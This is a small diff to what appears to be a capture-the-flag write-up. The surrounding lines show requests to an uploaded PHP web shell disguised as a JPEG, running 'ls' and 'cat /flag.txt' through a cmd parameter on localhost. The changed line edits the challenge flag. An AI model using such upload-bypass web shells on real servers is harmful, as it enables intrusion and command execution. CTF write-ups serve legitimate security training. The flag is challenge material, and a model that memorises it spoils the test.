@@ -109,7 +109,7 @@ http://localhost:PORT/uploads/shell.php.jpg?cmd=ls
 http://localhost:PORT/uploads/shell.php.jpg?cmd=cat%20/flag.txt
 ```
 
-**Flag** : `CTF{Upl04d_PHP_Sh3ll_M4st3r_2024}` 🎉
+**Flag** : `CTF{Upl04d_PHP_Sh3ll_M4st3r}` 🎉
 
 ---
 
